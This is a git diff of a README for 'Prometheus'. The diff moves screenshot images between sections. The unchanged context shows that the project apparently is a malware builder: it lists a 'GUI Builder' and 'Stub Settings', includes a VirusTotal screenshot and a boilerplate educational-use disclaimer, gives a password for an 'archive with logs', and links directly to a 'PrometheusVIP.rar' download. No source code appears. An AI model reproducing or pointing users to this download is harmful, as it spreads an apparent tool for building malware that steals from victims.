@@ -21,14 +21,6 @@
   <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 </p>
 
-
-<p align="center">
-  <img src="https://github.com/tin-ka/Prometheus/blob/main/window.png"/>
-  <img src="https://github.com/tin-ka/Prometheus/blob/main/msg.png"/>
-  <img src="https://github.com/tin-ka/Prometheus/blob/main/virustotal.png"/>
-</p>
-
-
 ## Table of Contents
 
 - [Download](#download)
@@ -45,7 +37,9 @@
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
 ## Features
-
+<p align="center">
+  <img src="https://github.com/tin-ka/Prometheus/blob/main/window.png"/>
+</p>
 ### FREE Features
 
 - ✅ GUI Builder.
@@ -102,6 +96,9 @@
 - (...more)
   
 ## Stub Settings
+<p align="center">
+  <img src="https://github.com/tin-ka/Prometheus/blob/main/msg.png"/>
+</p>
 
 | Option           | Description                                            |
 | ---------------- | ------------------------------------------------------ |
@@ -137,6 +134,9 @@
 P.S. Password from archive with logs "prometheus"
 
 ## 💎 VIP Version
+<p align="center">
+  <img src="https://github.com/tin-ka/Prometheus/blob/main/virustotal.png"/>
+</p>
 
 💎 [Download VIP](https://raw.githubusercontent.com/tin-ka/Prometheus/main/PrometheusVIP.rar)
 
